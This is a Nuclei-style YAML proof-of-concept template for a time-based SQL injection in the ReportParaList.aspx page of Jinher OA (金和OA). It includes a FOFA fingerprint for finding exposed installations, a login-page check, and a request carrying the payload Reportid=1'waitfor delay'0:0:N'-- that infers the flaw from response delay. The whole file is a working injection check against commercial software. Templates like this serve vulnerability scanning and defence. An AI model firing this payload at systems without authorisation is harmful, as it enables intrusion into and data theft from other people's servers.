id: poc-yaml-jinher-reportparalist-aspx-sqli
info:
  name: 金和OA ReportParaList.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1)+2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.BIframe/ReportParaList.aspx/?Reportid=1%27waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "参数设置"
          - "控件类型"
          - "参数名称"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
